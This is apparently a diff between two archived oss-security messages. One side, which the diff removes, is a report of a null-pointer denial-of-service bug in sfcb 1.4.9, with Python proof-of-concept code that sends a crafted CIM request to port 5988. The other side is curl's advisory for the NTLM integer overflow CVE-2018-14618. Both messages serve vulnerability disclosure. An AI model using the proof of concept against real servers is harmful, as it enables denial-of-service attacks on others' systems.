@@ -1,86 +1,98 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/01/31/3
-Message-ID: <722994b1.3f3f.1614cad02fb.Coremail.hxl1999@yeah.net>
-Date: Wed, 31 Jan 2018 22:44:22 +0800 (CST)
-From: XinleiHe <hxl1999@...h.net>
-To: oss-security@...ts.openwall.com
-Subject: report a vulnerability in sfcb software.
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/09/05/1
+Message-ID: <alpine.DEB.2.20.1809041916060.14115@tvnag.unkk.fr>
+Date: Wed, 5 Sep 2018 07:55:21 +0200 (CEST)
+From: Daniel Stenberg <daniel@...x.se>
+To: curl security announcements -- curl users <curl-users@...l.haxx.se>, curl-announce@...l.haxx.se, libcurl hacking <curl-library@...l.haxx.se>, oss-security@...ts.openwall.com
+Subject: [SECURITY ADVISORY] curl: NTLM password overflow via integer overflow
 Content-Type: text/plain; charset=utf-8
 
-Hi there,
+NTLM password overflow via integer overflow
+===========================================
 
+Project curl Security Advisory, September 5th 2018 -
+[Permalink](https://curl.haxx.se/docs/CVE-2018-14618.html)
 
-I am XinleiHe. I will report a vulnerability in sfcb software.
-SFCB is a CIM server for resource-constrained and embedded environments. It's offical website is sblim.sourceforge.net/wiki/index.php/Sfcb.
- 
-A null pointer vulnerabilty exists in sfcb newest version(1.4.9),a remote attacher can send a crafted packet trigger to this vulnerabilty , and make sfcbd DOS.
-I want to apply a cve id for this vulnerabilty.
+VULNERABILITY
+-------------
 
+libcurl contains a buffer overrun in the NTLM authentication code.
 
+The internal function `Curl_ntlm_core_mk_nt_hash` multiplies the `length` of
+the password by two (SUM) to figure out how large temporary storage area to
+allocate from the heap.
 
+The `length` value is then subsequently used to iterate over the password and
+generate output into the allocated storage buffer. On systems with a 32 bit
+`size_t`, the math to calculate SUM triggers an integer overflow when the
+password length exceeds 2GB (2^31 bytes). This integer overflow usually causes
+a very small buffer to actually get allocated instead of the intended very
+huge one, making the use of that buffer end up in a heap buffer overflow.
 
-You can use following python code to reproduce this vulnerability.
---------------------------------------------------------------
-import httplib
-from xml.dom.minidom import Document
-class write_xml(Document):
-    def __init__(self):
+(This bug is almost identical to
+[CVE-2017-8816](https://curl.haxx.se/docs/CVE-2017-8816.html).)
 
+We are not aware of any exploit of this flaw.
 
-        Document.__init__(self)
- 
-    def set_tag(self,tag):
-        self.tag = tag
-        self.cim = self.createElement(self.tag)
-        #self.setAttribute("encoding", "utf-8")
-        
-        self.cim.setAttribute("CIMVERSION", "2.0")
-        self.cim.setAttribute("DTDVERSION", "2.0")
-        self.appendChild(self.cim)
+INFO
+----
 
+This bug was introduced in commit
+[be285cde3f](https://github.com/curl/curl/commit/be285cde3f), April 2006.
 
-        self.msg = self.createElement("MESSAGE")
-        self.msg.setAttribute("ID", "4711")
-        self.msg.setAttribute("PROTOCOLVERSION","1.0")
-        self.cim.appendChild(self.msg)
+The Common Vulnerabilities and Exposures (CVE) project has assigned the name
+CVE-2018-14618 to this issue.
 
+CWE-131: Incorrect Calculation of Buffer Size
 
-        self.sim = self.createElement("SIMPLEREQ")
-        self.msg.appendChild(self.sim)
+AFFECTED VERSIONS
+-----------------
 
+This issue is only present on 32 bit systems. It also requires the password
+field to use more than 2GB of memory, which should be rare.
 
-        self.ime = self.createElement("IMETHODCALL")
-        self.ime.setAttribute("NAME","EnumerateInstances")
-        self.sim.appendChild(self.ime)
+- Affected versions: libcurl 7.15.4 to and including 7.61.0
+- Not affected versions: libcurl < 7.15.4 and >= 7.61.1
 
+curl is used by many applications, but not always advertised as such.
 
-        self.local = self.createElement("LOCALNAMESPACEPATH")
-        self.ime.appendChild(self.local)
-       
-        self.names1=self.createElement("NAMESPACE")
-        self.names1.setAttribute("NAME", "root")
-        self.local.appendChild(self.names1)
+THE SOLUTION
+------------
 
+In libcurl version 7.61.1, the integer overflow is avoided.
 
-    def display(self):
-        print self.toprettyxml(indent="   ")
-    def retdata(self):
-        return self.toprettyxml(indent="   ")
+A [patch for
+CVE-2018-14618](https://github.com/curl/curl/commit/57d299a499155d4b327e341c6024e293b0418243.patch)
+is available.
 
+RECOMMENDATIONS
+---------------
 
-def httpreq(data):
-conn = httplib.HTTPConnection("127.0.0.1", 5988, False)
-conn.request('POST', '/cimom',data)
-res = conn.getresponse() 
+We suggest you take one of the following actions immediately, in order of
+preference:
 
+  A - Upgrade curl to version 7.61.1
 
-def main():
-wx = write_xml()
-wx.set_tag('CIM')
-print wx.retdata()
-print httpreq(wx.retdata())
+  B - Apply the patch to your version and rebuild
 
+  C - Put length restrictions on the password you can pass to libcurl
 
-if __name__=='__main__':
-main()
--------------------------------------------------------
+TIME LINE
+---------
+
+It was [publicly reported](https://github.com/curl/curl/issues/2756) to the
+curl project on July 18, 2018.  We contacted distros@...nwall on August 27.
+
+curl 7.61.1 was released on September 5 2018, coordinated with the publication
+of this advisory.
+
+CREDITS
+-------
+
+Reported by Zhaoyang Wu. Patch by Daniel Stenberg.
+
+Thanks a lot!
+
+-- 
+
+  / daniel.haxx.se
